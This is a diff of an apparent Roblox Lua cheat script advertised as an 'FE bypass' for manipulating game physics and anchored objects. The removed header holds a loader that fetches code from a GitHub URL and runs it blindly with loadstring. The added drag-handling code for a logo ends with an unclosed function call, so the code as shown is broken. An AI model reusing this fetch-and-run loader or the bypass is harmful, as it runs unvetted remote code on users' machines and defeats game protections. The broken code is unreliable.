@@ -1,30 +1,3 @@
--- ═══════════════════════════════════════════════════════════
---     ADVANCED FE BYPASS + PHYSICS MANIPULATION
---     By: RapipppModss
---     Version: 4.0 - Ultimate Bypass Edition
---     MENCOBA BYPASS ANCHORED OBJECTS!
--- ═══════════════════════════════════════════════════════════
-
--- Load external script first
-local function loadExternalScript()
-    local success, err = pcall(function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/rapipppganzz/improve-database/refs/heads/main/test.txt"))()
-    end)
-    
-    if success then
-        print("✅ External script loaded successfully!")
-    else
-        warn("❌ Failed to load external script: " .. tostring(err))
-    end
-end
-
-loadExternalScript()
-wait(0.5)
-
--- ═══════════════════════════════════════════════════════════
---     ADVANCED PHYSICS MANIPULATION WITH ANCHOR BYPASS
--- ═══════════════════════════════════════════════════════════
-
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
 local mouse = player:GetMouse()
@@ -628,4 +601,33 @@ local dragLogoInput, dragLogoStart, logoStartPos
 local draggingLogo = false
 
 MinimizedLogo.InputBegan:Connect(function(input)
- 
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        draggingLogo = true
+        dragLogoStart = input.Position
+        logoStartPos = MinimizedLogo.Position
+    end
+end)
+
+MinimizedLogo.InputChanged:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseMovement then
+        dragLogoInput = input
+    end
+end)
+
+MinimizedLogo.InputEnded:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        draggingLogo = false
+    end
+end)
+
+game:GetService("UserInputService").InputChanged:Connect(function(input)
+    if input == dragLogoInput and draggingLogo then
+        local delta = input.Position - dragLogoStart
+        MinimizedLogo.Position = UDim2.new(
+            logoStartPos.X.Scale,
+            logoStartPos.X.Offset + delta.X,
+            logoStartPos.Y.Scale,
+            logoStartPos.Y.Offset + delta.Y
+        )
+    end
+end
